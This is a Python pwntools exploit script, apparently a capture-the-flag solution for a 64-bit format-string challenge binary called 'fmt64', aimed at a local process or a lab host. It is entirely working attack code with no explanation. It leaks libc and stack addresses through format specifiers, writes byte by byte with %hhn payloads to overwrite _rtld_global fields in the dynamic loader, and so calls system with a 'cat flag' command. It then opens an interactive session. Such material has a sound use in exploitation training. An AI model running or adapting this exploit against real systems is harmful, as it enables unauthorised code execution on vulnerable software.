import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./fmt64')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./fmt64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('192.168.31.18',10000)
			elf=ELF('./fmt64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		
		def fmt(addr1,addr2):
			arg0=(addr1)&0xff
			arg1=(addr1&0xff00)>>8
			arg2=(addr1&0xff0000)>>16
			arg3=(addr1&0xff000000)>>24
			arg4=(addr1&0xff00000000)>>32
			arg5=(addr1&0xff0000000000)>>40
			arg6=(addr1&0xff000000000000)>>48
			arg7=(addr1&0xff00000000000000)>>56
			#pay=fmtstr_payload(8,{elf.got['printf']:system_addr})
			pay1='%'+str(arg0)+'c%9$hhn'
			pay2='%'+str(arg1)+'c%9$hhn'
			pay3='%'+str(arg2)+'c%9$hhn'
			pay4='%'+str(arg3)+'c%9$hhn'
			pay5='%'+str(arg4)+'c%9$hhn'
			pay6='%'+str(arg5)+'c%9$hhn'
			pay7='%'+str(arg6)+'c%9$hhn'
			pay8='%'+str(arg7)+'c%9$hhn'
			# if addr1==system_addr:
			# 	pay7='%9$hhn'
			# 	pay8='%9$hhn'
			pay1=pay1.ljust(0x10,'a')
			pay2=pay2.ljust(0x10,'a')
			pay3=pay3.ljust(0x10,'a')
			pay4=pay4.ljust(0x10,'a')
			pay5=pay5.ljust(0x10,'a')
			pay6=pay6.ljust(0x10,'a')
			pay7=pay7.ljust(0x10,'a')
			pay8=pay8.ljust(0x10,'a')
			
			pay1+=p64(addr2)
			pay2+=p64(addr2+1)
			pay3+=p64(addr2+2)
			pay4+=p64(addr2+3)
			pay5+=p64(addr2+4)
			pay6+=p64(addr2+5)
			pay7+=p64(addr2+6)
			pay8+=p64(addr2+7)

			io.recv()
			io.sendline(pay1)
			io.recv()
			io.sendline(pay2)
			io.recv()
			io.sendline(pay3)
			io.recv()
			io.sendline(pay4)
			io.recv()
			io.sendline(pay5)
			io.recv()
			io.sendline(pay6)
			io.recv()
			io.sendline(pay7)
			io.recv()
			io.sendline(pay8)


		io.recv()
		io.sendline('%6$p%41$p')
		libc_base=int(io.recv(14),16)-libc.sym['_IO_2_1_stdout_']
		stack_addr=int(io.recv(14),16)
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		ld.address=libc_base+0x3ca000
		rdi_addr=ld.sym['_rtld_global']+2312
		rip_addr=ld.sym['_rtld_global']+3848
		cat_flag=stack_addr-0x120
		pop_rdi=libc_base+0x0000000000021102
		pop_rdx=libc_base+0x0000000000001b92
		pop_rsi=libc_base+0x00000000000202e8
		fmt(0x67616c6620746163,rdi_addr)
		fmt(system_addr,rip_addr)
		#io.recv()
		#io.sendline('cat /flag\x00')
		io.recv()

		
		
		success('libc_base:'+hex(libc_base))	
		# io.sendline('ls')
		# gdb.attach(io)
		# pause()
		io.shutdown("write")
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue